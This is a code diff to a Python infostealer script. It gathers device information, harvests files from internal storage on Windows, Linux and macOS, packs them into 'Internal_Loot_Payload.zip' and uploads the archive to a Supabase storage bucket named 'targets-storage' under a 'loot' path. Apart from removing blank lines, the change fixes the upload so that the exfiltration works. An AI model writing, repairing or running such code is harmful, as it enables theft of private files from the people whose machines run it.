@@ -6,7 +6,6 @@ import json
 import zipfile
 from supabase import create_client, Client
 
-
 SUPABASE_URL = os.environ.get("SUPABASE_URL", "YOUR_SUPABASE_URL")
 SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "YOUR_SUPABASE_KEY")
 
@@ -28,7 +27,6 @@ def get_device_intelligence():
 def harvest_internal_storage():
     loot_files = []
     sys_type = platform.system()
-    
     
     if sys_type in ["Windows", "Linux", "Darwin"]:
         base_search_paths = [
@@ -76,7 +74,6 @@ if __name__ == "__main__":
     with open(report_file, "w", encoding="utf-8") as f:
         json.dump(full_report, f, indent=4, ensure_ascii=False)
         
-    
     loot_zip = "Internal_Loot_Payload.zip"
     with zipfile.ZipFile(loot_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
         if os.path.exists(report_file):
@@ -89,16 +86,19 @@ if __name__ == "__main__":
                 
     print(f"[+] Payload compressed: {loot_zip}")
     
-    
     if SUPABASE_URL != "YOUR_SUPABASE_URL":
         try:
             supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+            
+        
             with open(loot_zip, 'rb') as f:
-                response = supabase.storage.from_("targets-storage").upload(
-                    file=f,
-                    path=f"loot/{loot_zip}",
-                    file_options={"upsert": "true"}
-                )
+                file_bytes = f.read()
+
+            response = supabase.storage.from_("targets-storage").upload(
+                path=f"loot/{loot_zip}",
+                file=file_bytes,
+                file_options={"upsert": "true"}
+            )
             print("[+] Target loot uploaded automatically to Supabase Storage!")
         except Exception as e:
             print("[-] Auto-upload error:", e)
